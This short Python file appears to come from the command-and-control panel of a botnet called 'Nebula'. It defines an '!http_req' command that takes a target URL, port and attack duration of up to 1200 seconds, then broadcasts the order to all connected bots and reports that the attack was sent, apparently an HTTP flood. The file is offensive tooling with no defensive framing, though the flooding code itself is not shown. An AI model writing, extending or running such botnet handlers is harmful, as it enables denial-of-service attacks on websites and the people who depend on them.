import time
from colorama import Fore

def http_req(args, validate_time, send, client, ansi_clear, broadcast, data):
    if len(args) == 4:
        url = args[1]
        port = args[2]
        secs = args[3]
        if validate_time(secs):
            time.sleep(1)
            send(client, f"{Fore.LIGHTWHITE_EX}Attack successfully sent to all {Fore.LIGHTBLACK_EX}Nebula {Fore.LIGHTWHITE_EX}servers!")
            broadcast(data)
        else:
            send(client, Fore.RED + 'Invalid attack duration (1-1200 seconds)')
    else:
        send(client, f'Usage: {Fore.LIGHTBLACK_EX}!http_req [URL] [PORT] [TIME]')